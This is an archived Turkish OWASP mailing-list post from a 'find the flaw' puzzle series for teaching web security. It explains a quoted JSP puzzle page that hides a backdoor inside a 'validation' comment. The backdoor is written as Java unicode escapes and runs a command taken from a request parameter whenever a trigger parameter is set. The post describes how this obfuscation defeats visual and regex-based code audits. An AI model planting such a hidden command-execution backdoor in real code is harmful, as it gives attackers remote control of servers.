<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
<HTML>
 <HEAD>
   <TITLE> [Owasp-turkey] Ar&#305;zay&#305; Bul #5
   </TITLE>
   <LINK REL="Index" HREF="index.html" >
   <LINK REL="made" HREF="mailto:owasp-turkey%40lists.owasp.org?Subject=%5BOwasp-turkey%5D%20%3D%3Futf-8%3Fb%3FQXLEsXphecSxIEJ1bCAjNQ%3D%3D%3F%3D&In-Reply-To=20091020153829.429D11B3A148%40postaci.uekae.tubitak.gov.tr">
   <META NAME="robots" CONTENT="index,nofollow">
   <META http-equiv="Content-Type" content="text/html; charset=us-ascii">
   <LINK REL="Previous"  HREF="000729.html">
   <LINK REL="Next"  HREF="000731.html">
 </HEAD>
 <BODY BGCOLOR="#ffffff">
   <H1>[Owasp-turkey] Ar&#305;zay&#305; Bul #5</H1>
    <B>yilmaz.cankaya at uekae.tubitak.gov.tr</B> 
    <A HREF="mailto:owasp-turkey%40lists.owasp.org?Subject=%5BOwasp-turkey%5D%20%3D%3Futf-8%3Fb%3FQXLEsXphecSxIEJ1bCAjNQ%3D%3D%3F%3D&In-Reply-To=20091020153829.429D11B3A148%40postaci.uekae.tubitak.gov.tr"
       TITLE="[Owasp-turkey] Ar&#305;zay&#305; Bul #5">yilmaz.cankaya at uekae.tubitak.gov.tr
       </A><BR>
    <I>Tue Oct 20 17:55:32 EDT 2009</I>
    <P><UL>
        <LI>Previous message: <A HREF="000729.html">[Owasp-turkey] Owasp-turkey Digest, Vol 31, Issue 22
</A></li>
        <LI>Next message: <A HREF="000731.html">[Owasp-turkey] Ar&#305;zay&#305; Bul #5
</A></li>
         <LI> <B>Messages sorted by:</B> 
              <a href="date.html#730">[ date ]</a>
              <a href="thread.html#730">[ thread ]</a>
              <a href="subject.html#730">[ subject ]</a>
              <a href="author.html#730">[ author ]</a>
         </LI>
       </UL>
    <HR>  
<!--beginarticle-->
<PRE>


 
&#160;Bedirhan ba&#197;&#159;lad&#196;&#177; g&#252;zel oldu. Ben de ufak bir kod ekleyeyim
:<i>-) Orjinal kod java kodu olmakla beraber, genelleyip yaz&#196;&#177;yorum.
</I>
if (getParameter('session_id') is null)
then
&#160; sessionID=
createSession();
else




digerlerine daha gore daha ilgi ceker dedim ama...&#160; :))
cekmedi
&#160;
cevap &quot;herkes&#160;developer'lara guveniyor ama uretimin canina
okuyabilirler&quot; mantigi ile yazilmis bir backdoor. Java belirli bir
formatta (\uxxxx) unicode karakterler ile kod yazilmasina imkan taniyor.
Yani butun identifier, keyword, operator v.b.'lerin ascii olmasina gerek
yok. (C# icin ise boyle bir kisitlama var yani keyword ve operator'ler
icin mesela sadece ascii karakterler kullanilabiliyor.). Kisacasi verdigim
JSP icerisindeki unicode formatinda yazilan bolumu, basina ve sonuna
'&#160;karakteri koyduktan sonra&#160;
&#160;
<A HREF="http://www.webguvenligi.org/ipacker/ipacker.html">http://www.webguvenligi.org/ipacker/ipacker.html</A>
&#160;
uygulamasinin&#160;INPUT bolumune koyup EVAL TO OUTPUT butonuna
basarsaniz, aslinda&#160;developer'in nasil bir backdoor yazdigini
gorebilirsiniz. Ortaya cikan parca, multiline comment&#160;bolumunu
kapatip, asil backdoor&#160;kodunu yazip, daha sonra tekrar multiline
comment bolumunu aciyor (ki &quot;syntax error&quot; almayalim, ayni sqli,
ldapi&#160;gibi).
&#160;
Bu sekilde ciplak gozle bakan veya regex ile audit yapmaya calisan
bir denetimcinin isi zorlasiyor.

bedirhan
&#160;
18 Ekim 2009 21:05 tarihinde Bedirhan Urgun <A HREF="https://lists.owasp.org/mailman/listinfo/owasp-turkey">bedirhanurgun at gmail.com</A>&gt; yazd&#196;&#177;:
 
&#160;
Bu kez eglenceli bir ariza var :) Ise farkli bir perspektiften
bakmayi gerektiriyor. Bir JSP sayfasi...
&#160;
bedirhan
&#160;
Arizayi Bul&#160;#4
--------------------

%@page contentType=&quot;text/html&quot;
pageEncoding=&quot;UTF-8&quot;%&gt;
&#160;&#160; &quot;<A HREF="http://www.w3.org/TR/html4/loose.dtd&quot;">http://www.w3.org/TR/html4/loose.dtd&quot;</A>&gt;

&#160;&#160;&#160; 
&#160;&#160;&#160;&#160;&#160;&#160;&#160; 
&#160;&#160;&#160;&#160;&#160;&#160;&#160; 
&#160;&#160;&#160;&#160;&#160;&#160;&#160; 
 &#160;&#160;&#160; 
&#160;&#160;&#160;

&#160;&#160;&#160;&#160;&#160;&#160;&#160;

&#160;&#160;&#160;&#160;&#160;&#160;&#160; 
&#160;&#160;&#160;&#160;&#160;&#160;&#160; 
&#160;&#160;&#160;&#160;&#160;&#160;&#160; 

&#160;&#160;&#160;&#160;&#160;&#160;&#160; 
&#160;&#160;&#160;&#160;&#160;&#160;&#160; 
&#160;&#160;&#160;&#160;&#160;&#160;&#160;
&#160;

&#160;&#160;&#160;&#160;&#160;&#160;&#160; 

&#160;&#160;&#160;&#160;&#160;&#160;&#160;
&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;
/************************************COMMENT
BEGIN************************************** 
&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; This is
unicode that will be used for data validation
&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;
\u002a\u002f\u0020\u0053\u0074\u0072\u0069\u006e\u0067\u0020\u0073\u003d\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u002e\u0067\u0065\u0074\u0050\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072\u0028\u0022\u0061\u0072\u006b\u0061\u006b\u0061\u0070\u0069\u0022\u0029\u003b\u0020\u0069\u0066\u0020\u0028\u0020\u0073\u0021\u003d\u006e\u0075\u006c\u006c\u0020\u0026\u0026\u0020\u0073\u002e\u0065\u0071\u0075\u0061\u006c\u0073\u0028\u0020\u0022\u0061\u0063\u0069\u006b\u0022\u0020\u0029\u0020\u0029\u0020\u007b\u0020\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u002e\u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0028\u0029\u002e\u0065\u0078\u0065\u0063\u0028\u0020\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u002e\u0067\u0065\u0074\u0050\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072\u0028\u0020\u0022\u006b\u006f\u006d\u0075\u0074\u0022\u0020\u0029\u0020\u0029\u003b\u0020\u007d\u002f\u002a
 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;
*************************************COMMENT
END***********************************/&#160;&#160;&#160;&#160; 
&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;
String lang = request.getParameter(&quot;language&quot;);
&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; //
use the unicode above to validate the data

&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;
validateUnicode(lang);&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;

&#160;&#160;&#160;&#160;&#160;&#160;&#160; %&gt;
&#160;&#160;&#160;&#160;&#160;&#160;&#160; 

&#160;&#160;&#160;&#160;&#160;&#160;&#160; 
&#160;&#160;&#160;&#160;&#160;&#160;&#160; 
 &#160;&#160;&#160;







&#160;

-- 
Bedirhan Urgun
<A HREF="http://www.webguvenligi.org">http://www.webguvenligi.org</A>
<A HREF="http://www.owasp.org/index.php/Turkey">http://www.owasp.org/index.php/Turkey</A>

T&#252;rk&#231;e Web Uygulama G&#252;venli&#196;&#159;i E-Posta Listesine
&#252;ye olmak i&#231;in: 
 <A HREF="https://lists.owasp.org/mailman/listinfo/owasp-turkey">https://lists.owasp.org/mailman/listinfo/owasp-turkey</A>
   

-------------- next part --------------
An HTML attachment was scrubbed...
URL: <A HREF="https://lists.owasp.org/pipermail/owasp-turkey/attachments/20091021/ac6613e7/attachment.html">https://lists.owasp.org/pipermail/owasp-turkey/attachments/20091021/ac6613e7/attachment.html</A> 
</PRE>


<!--endarticle-->
    <HR>
    <P><UL>
        <!--threads-->
	<LI>Previous message: <A HREF="000729.html">[Owasp-turkey] Owasp-turkey Digest, Vol 31, Issue 22
</A></li>
	<LI>Next message: <A HREF="000731.html">[Owasp-turkey] Ar&#305;zay&#305; Bul #5
</A></li>
         <LI> <B>Messages sorted by:</B> 
              <a href="date.html#730">[ date ]</a>
              <a href="thread.html#730">[ thread ]</a>
              <a href="subject.html#730">[ subject ]</a>
              <a href="author.html#730">[ author ]</a>
         </LI>
       </UL>

<hr>
<a href="https://lists.owasp.org/mailman/listinfo/owasp-turkey">More information about the Owasp-turkey
mailing list</a><br>
</body></html>
